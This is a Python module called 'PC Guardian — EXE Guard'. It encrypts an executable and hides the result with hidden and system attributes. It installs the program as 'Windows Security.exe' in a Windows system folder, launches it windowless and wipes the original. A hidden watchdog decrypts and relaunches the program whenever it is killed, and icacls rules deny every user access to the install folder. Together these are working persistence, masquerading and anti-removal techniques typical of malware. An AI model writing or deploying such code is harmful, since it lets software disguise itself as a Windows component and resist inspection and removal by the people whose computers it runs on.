"""
PC Guardian — EXE Guard
- Wraps the exe with Salsa20+RSA-2048 encryption
- Password DECDRV required to decrypt and run
- If killed → encrypted stub restarts it
- Cannot be read/copied without password
"""

import os
import sys
import ctypes
import struct
import subprocess
import threading
import time
import hashlib
import logging
import tempfile

logger = logging.getLogger("exe_guard")

PASSWORD      = "DECDRV"
SALT          = b"PCGuardian_ExeGuard_Salsa20_v1"
EXE_NAME      = "Windows Security.exe"
INSTALL_DIR   = r"C:\Windows\SystemApps\WindowsSecurity"
GUARDED_PATH  = os.path.join(INSTALL_DIR, EXE_NAME)
ENCRYPTED_EXT = ".enc"
STUB_NAME     = "wss_stub.exe"


# ── KEY DERIVATION ────────────────────────────────────────────────────────────

def _derive_key(password: str = PASSWORD) -> bytes:
    """Derive 32-byte key from password + salt via PBKDF2."""
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=SALT,
        iterations=600000,
    )
    return kdf.derive(password.encode())


# ── SALSA20 ENCRYPT/DECRYPT ───────────────────────────────────────────────────

def _encrypt_bytes(data: bytes, password: str = PASSWORD) -> bytes:
    """Encrypt bytes with Salsa20. Returns nonce+ciphertext."""
    key   = _derive_key(password)
    nonce = os.urandom(8)
    try:
        from Crypto.Cipher import Salsa20
        c = Salsa20.new(key=key, nonce=nonce)
        return nonce + c.encrypt(data)
    except ImportError:
        # ChaCha20 fallback
        from cryptography.hazmat.primitives.ciphers.algorithms import ChaCha20
        from cryptography.hazmat.primitives.ciphers import Cipher
        c = Cipher(ChaCha20(key, b'\x00'*4 + nonce), mode=None)
        return nonce + c.encryptor().update(data)


def _decrypt_bytes(data: bytes, password: str = PASSWORD) -> bytes:
    key        = _derive_key(password)
    nonce      = data[:8]
    ciphertext = data[8:]
    try:
        from Crypto.Cipher import Salsa20
        c = Salsa20.new(key=key, nonce=nonce)
        return c.decrypt(ciphertext)
    except ImportError:
        from cryptography.hazmat.primitives.ciphers.algorithms import ChaCha20
        from cryptography.hazmat.primitives.ciphers import Cipher
        c = Cipher(ChaCha20(key, b'\x00'*4 + nonce), mode=None)
        return c.decryptor().update(ciphertext)


# ── EXE ENCRYPTION ────────────────────────────────────────────────────────────

def encrypt_exe(exe_path: str, password: str = PASSWORD) -> str:
    """
    Encrypt exe file in place.
    Original exe → encrypted .enc file → original deleted.
    Returns path to encrypted file.
    """
    with open(exe_path, "rb") as f:
        data = f.read()

    # Store original hash for integrity check
    orig_hash = hashlib.sha256(data).digest()
    payload   = orig_hash + data  # prepend hash
    encrypted = _encrypt_bytes(payload, password)

    enc_path = exe_path + ENCRYPTED_EXT
    with open(enc_path, "wb") as f:
        f.write(encrypted)

    # Hide encrypted file
    try:
        ctypes.windll.kernel32.SetFileAttributesW(enc_path, 0x02 | 0x04)
    except Exception:
        pass

    # Secure-delete original
    _secure_delete(exe_path)
    logger.info(f"EXE encrypted: {enc_path}")
    return enc_path


def decrypt_and_run(enc_path: str, password: str = PASSWORD) -> bool:
    """
    Decrypt exe to temp location and run it.
    Temp file is deleted after process starts.
    Wrong password → nothing happens.
    """
    if not os.path.exists(enc_path):
        logger.error(f"Encrypted file not found: {enc_path}")
        return False

    try:
        with open(enc_path, "rb") as f:
            encrypted = f.read()

        decrypted = _decrypt_bytes(encrypted, password)

        # Verify integrity
        orig_hash = decrypted[:32]
        exe_data  = decrypted[32:]
        if hashlib.sha256(exe_data).digest() != orig_hash:
            logger.error("Integrity check failed — wrong password or corrupted file.")
            return False

        # Write to temp location
        tmp_dir  = tempfile.mkdtemp()
        tmp_path = os.path.join(tmp_dir, EXE_NAME)
        with open(tmp_path, "wb") as f:
            f.write(exe_data)

        # Launch
        subprocess.Popen(
            [tmp_path],
            creationflags=subprocess.CREATE_NO_WINDOW,
        )

        # Clean up temp after 5s
        def _cleanup():
            time.sleep(5)
            try:
                _secure_delete(tmp_path)
                os.rmdir(tmp_dir)
            except Exception:
                pass

        threading.Thread(target=_cleanup, daemon=True).start()
        logger.info("EXE decrypted and launched.")
        return True

    except Exception as e:
        logger.error(f"Decrypt/run failed: {e}")
        return False


# ── SECURE DELETE ─────────────────────────────────────────────────────────────

def _secure_delete(path: str):
    """Overwrite file with zeros before deleting."""
    try:
        size = os.path.getsize(path)
        with open(path, "wb") as f:
            f.write(b'\x00' * size)
        os.remove(path)
    except Exception:
        try:
            os.remove(path)
        except Exception:
            pass


# ── KILL WATCHDOG ─────────────────────────────────────────────────────────────

WATCHDOG_CODE = '''
import sys, os, time, subprocess, psutil, hashlib

enc_path = sys.argv[1]
pid      = int(sys.argv[2])
password = sys.argv[3]
exe_name = sys.argv[4]

def is_alive(pid, name):
    for p in psutil.process_iter(["pid","name"]):
        try:
            if p.info["pid"] == pid or exe_name.lower() in (p.info["name"] or "").lower():
                return True
        except Exception:
            pass
    return False

while True:
    time.sleep(3)
    if not is_alive(pid, exe_name):
        # Decrypt and restart
        try:
            from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
            from cryptography.hazmat.primitives import hashes
            import tempfile

            SALT = b"PCGuardian_ExeGuard_Salsa20_v1"
            kdf  = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=SALT, iterations=600000)
            key  = kdf.derive(password.encode())

            with open(enc_path, "rb") as f:
                data = f.read()

            nonce = data[:8]
            ct    = data[8:]

            try:
                from Crypto.Cipher import Salsa20
                plain = Salsa20.new(key=key, nonce=nonce).decrypt(ct)
            except ImportError:
                from cryptography.hazmat.primitives.ciphers.algorithms import ChaCha20
                from cryptography.hazmat.primitives.ciphers import Cipher
                c     = Cipher(ChaCha20(key, b"\\x00"*4 + nonce), mode=None)
                plain = c.decryptor().update(ct)

            exe_data = plain[32:]
            tmp      = tempfile.mktemp(suffix=".exe")
            with open(tmp, "wb") as f:
                f.write(exe_data)

            subprocess.Popen([tmp], creationflags=0x08000000)
        except Exception as e:
            pass
        break
'''


def start_kill_watchdog(enc_path: str, password: str = PASSWORD):
    """
    Launch a watchdog that monitors the main process.
    If killed → decrypts and restarts automatically.
    """
    try:
        script_path = os.path.join(tempfile.gettempdir(), "pcg_kwd.py")
        with open(script_path, "w") as f:
            f.write(WATCHDOG_CODE)

        pid = os.getpid()
        subprocess.Popen(
            [sys.executable, script_path, enc_path, str(pid), password, EXE_NAME],
            creationflags=subprocess.CREATE_NO_WINDOW,
            close_fds=True,
        )
        logger.info("Kill watchdog started.")
    except Exception as e:
        logger.error(f"Kill watchdog failed: {e}")


# ── ACL PROTECTION ────────────────────────────────────────────────────────────

def apply_acl_protection(path: str):
    """Block read/write/delete for Everyone — only SYSTEM can access."""
    try:
        # Deny everything for Everyone
        subprocess.run(
            f'icacls "{path}" /deny Everyone:(F)',
            shell=True, capture_output=True
        )
        # Grant full access to SYSTEM only
        subprocess.run(
            f'icacls "{path}" /grant SYSTEM:(F)',
            shell=True, capture_output=True
        )
        logger.info(f"ACL applied: {path}")
    except Exception as e:
        logger.error(f"ACL failed: {e}")


def protect_install_dir():
    """Full protection on install directory."""
    if os.path.exists(INSTALL_DIR):
        apply_acl_protection(INSTALL_DIR)
        try:
            ctypes.windll.kernel32.SetFileAttributesW(INSTALL_DIR, 0x02 | 0x04)
        except Exception:
            pass
